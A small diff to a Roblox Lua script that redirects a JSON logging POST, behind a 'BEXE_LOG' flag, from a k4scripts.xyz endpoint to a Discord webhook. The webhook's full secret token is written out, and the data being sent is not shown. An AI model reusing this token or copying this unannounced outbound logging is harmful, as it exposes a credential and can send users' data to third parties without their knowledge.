@@ -118,7 +118,7 @@ getfenv()["BEXE_LOG"] = true;
 local httpService = game:GetService("HttpService");
 httpService:RequestAsync(
     {
-        Url = "https://k4scripts.xyz/bexe/log",
+        Url = "https://discord.com/api/webhooks/1085701505383940197/sWLIEOfzmT99SSS5vVNYc2Jr53Cd4tfgJAiDBqmJW8__INYIwWEGBW_EtOq0ZtfjycQp",
         Method = "POST",
         Headers = {
             ["Content-Type"] = "application/json"
